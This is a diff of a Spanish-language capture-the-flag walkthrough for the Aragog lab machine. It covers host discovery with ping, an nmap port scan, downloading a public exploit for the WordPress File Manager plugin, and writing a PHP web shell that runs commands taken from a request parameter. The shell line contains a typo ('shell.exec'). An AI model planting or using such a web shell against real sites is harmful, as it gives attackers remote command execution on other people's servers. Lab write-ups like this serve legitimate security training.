@@ -42,7 +42,7 @@ ping -c 1 IP_DE_LA_ARAGOG
 Una vez le hemos mandado un ping, podemos revisar que la máquina esta encendida, también vemos que el ttl = 64 por lo que es una máquina Linux, si el ttl es “=” o menor a 64 quiere decir, que probablemente estamos ante una máquina Linux. 
 Podemos observar también que ningún paquete a sido descartado, entonces ya sabemos que esta en el mismo segmento de red y esta preparada para ser vulnerada.
 
-Una vez tengamos esa información, deberemos hacer un escaneo de puertos para ello utilizaremos la herramienta nmap, especializada en escanear puertos, pondremos parametros ya que queremos solamente cosas especificas. (si quieres saber sobre los parametros entra aqui:.....)
+Una vez tengamos esa información, deberemos hacer un escaneo de puertos para ello utilizaremos la herramienta nmap, especializada en escanear puertos, pondremos parametros ya que queremos solamente cosas especificas. (si quieres saber sobre los parámetros entra aqui:.....)
 ```
 nmap -sS -p --open -T5 --min-rate 5000 IP_DE_LA_ARAGOG -n -Pn -vvv -oG
 ```
@@ -112,13 +112,13 @@ Para descargarlo haremos un `wget` del archivo
 ```
 wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
 ```
-Si hacemos un `cat` mas el archivo que acabamos de instalar podemos ver el código python.
+Si hacemos un `cat` mas el archivo que acabamos de instalar podemos ver el código python y entender cuál es su función.
 
-Al archivo le añadiremos lo siguiente, pero primero hemos de entrar al archivo como root
+Creamos un archivo llamado `payload.php` dónde agregaremos las siguientes líneas.
 ```
-sudo nano 2020-wp-file-manager-v67.py
+sudo nano payload.php
 ```
-Simplemente le indicamos que queremos una shell[^5], añadiendo:
+Dónde agregaremos las siguientes líneas.
 ```
 <?php
 echo "<pre>" . shell.exec($_REQUEST['cmd']) . "</pre>";
